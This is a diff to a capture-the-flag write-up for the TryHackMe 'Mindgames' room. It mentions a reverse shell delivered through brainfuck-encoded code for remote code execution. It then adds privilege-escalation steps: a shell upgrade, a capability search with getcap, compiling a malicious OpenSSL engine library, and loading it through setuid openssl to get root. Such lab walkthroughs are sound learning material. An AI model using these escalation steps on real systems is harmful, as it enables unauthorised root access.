@@ -3,7 +3,7 @@ Link: https://tryhackme.com/room/mindgames
 
 Connect to Tryhackme vpn and spawn the machine  
 
-export the ip ("export IP=<target IP>")  
+export the ip ("export IP='target IP'")  
 
 Start with a nmap/rustscan scan ("nmap -sC -sV $IP"/"rustscan -a $IP")  
 
@@ -67,14 +67,67 @@ then I converted the python reverse shell payload into brainfuck and then execut
 
 It got RCE vulnerability and we got the shell  
 
+
+```
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+```  
+
 to get the user.txt  
 
-```cat /home/mindgames/user.txt ```  
+```
+cat /home/mindgames/user.txt 
+
+```  
 
 
 To get the Root Shell  
 
-Do some manual SUID enum
+let’s try "sudo -l" to see if mindgames can run sudo:  
+
+but we don't have mindgames password  
+
+Now let's check for capabilities
+
+```
+getcap -r / 2>/dev/null
+```  
+
+Openssl has the setuid cap.  
+
+write an C program to exploit it  
+
+refer to <a href="https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/"></a>  
+
+
+Now compile this c program  
+
+```
+gcc -fPIC -o filename.o -c filename.c && gcc -shared -o filename.so -lcrypto filename.o
+
+```  
+
+Now transfer the ".so" file to the target machine using python's http server  
+
+then use Openssl and execute the  new lib  
+
+```
+openssl req -engine shellroot.so
+
+```  
+
+and boom we are ROOT  
+
+to get the final flag  
+
+```
+cat /root/root.txt
+
+```  
+
+Thankyou
+
+
 
 
 
